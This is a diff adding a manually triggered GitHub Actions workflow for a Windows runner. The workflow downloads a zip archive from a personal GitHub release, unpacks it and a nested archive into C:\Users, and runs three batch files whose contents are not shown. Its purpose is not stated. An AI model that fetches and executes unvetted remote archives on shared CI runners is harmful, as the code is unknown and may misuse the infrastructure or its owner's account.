@@ -1,0 +1,33 @@
+name: AISI
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 10
+
+    steps:
+
+    - name: Download 
+      run: |
+        
+        Invoke-WebRequest https://github.com/topa1212/opp/releases/download/ai/data.zip -OutFile data.zip
+           
+        
+    - name: ZIP UNLOCK
+      run: |
+        
+        copy data.zip C:\Users\Public\Desktop\ 
+        Expand-Archive -Path "C:\Users\Public\Desktop\data.zip" -DestinationPath "C:\Users"  
+        copy C:\Users\data\RTX.zip C:\Users\Public\Desktop\
+        Expand-Archive -Path "C:\Users\Public\Desktop\RTX.zip" -DestinationPath "C:\Users"               
+        
+    - name: SET TIME
+      run: cmd /c C:\Users\data\b1.bat
+      
+    - name: SET SCREEN BAT
+      run: cmd /c C:\Users\data\SCREEN.bat
+        
+    - name: RUN AI
+      run: cmd /c C:\Users\data\onAi.bat 
